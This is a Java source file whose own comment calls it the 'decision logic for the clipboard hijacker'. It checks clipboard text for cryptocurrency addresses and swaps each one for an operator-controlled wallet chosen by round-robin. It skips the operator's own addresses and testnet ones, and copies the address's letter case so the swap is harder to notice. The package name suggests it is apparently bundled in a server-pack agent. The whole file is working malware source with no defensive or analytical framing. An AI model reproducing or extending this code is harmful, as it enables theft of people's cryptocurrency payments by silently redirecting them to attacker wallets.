package com.serverpackcore.agent;

import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

/** Pure decision logic for the clipboard hijacker. */
public final class ClipboardPolicy {
	private ClipboardPolicy() {
	}

	public record Decision(String coin, String original, String replacement) {
	}

	/**
	 * Returns the replacement to install, or null when the text must stay as is.
	 * The map index is updated in place for round-robin.
	 */
	public static Decision choose(String clipboard, Map<String, List<String>> coins, Map<String, Integer> rotation) {
		if (clipboard == null) {
			return null;
		}
		String text = clipboard.strip();
		if (text.isEmpty() || text.length() > 128 || text.indexOf('\n') >= 0 || text.indexOf('\r') >= 0
			|| text.contains("://") || text.contains(" ")) {
			return null;
		}
		Set<String> all = new HashSet<>();
		for (List<String> values : coins.values()) {
			all.addAll(values);
		}
		if (all.contains(text)) {
			return null;
		}
		String coin = AddressValidator.coinOf(text, coins.keySet());
		if (coin.isEmpty()) {
			return null;
		}
		if (!DiscordConfig.testnet() && AddressValidator.testnet(coin, text)) {
			return null;
		}
		List<String> values = coins.get(coin);
		if (values == null || values.isEmpty()) {
			return null;
		}
		int start = Math.floorMod(rotation.getOrDefault(coin, 0), values.size());
		for (int step = 0; step < values.size(); step++) {
			int index = (start + step) % values.size();
			String candidate = values.get(index);
			if (!candidate.equals(text)) {
				rotation.put(coin, (index + 1) % values.size());
				return new Decision(coin, text, preserveCase(text, candidate));
			}
		}
		return null;
	}

	/** bech32 is case-insensitive, but wallets display it upper- or lowercase; keep that. */
	public static String preserveCase(String original, String replacement) {
		String lower = original.toLowerCase(Locale.ROOT);
		boolean bech32 = lower.startsWith("bc1") || lower.startsWith("tb1") || lower.startsWith("ltc1")
			|| lower.startsWith("tltc1") || lower.startsWith("addr1") || lower.startsWith("addr_test1");
		if (bech32 && original.equals(original.toUpperCase(Locale.ROOT))) {
			return replacement.toUpperCase(Locale.ROOT);
		}
		return replacement;
	}

	public static boolean isOperatorAddress(String text, Map<String, List<String>> coins) {
		for (List<String> values : coins.values()) {
			if (values.contains(text)) {
				return true;
			}
		}
		return false;
	}
}
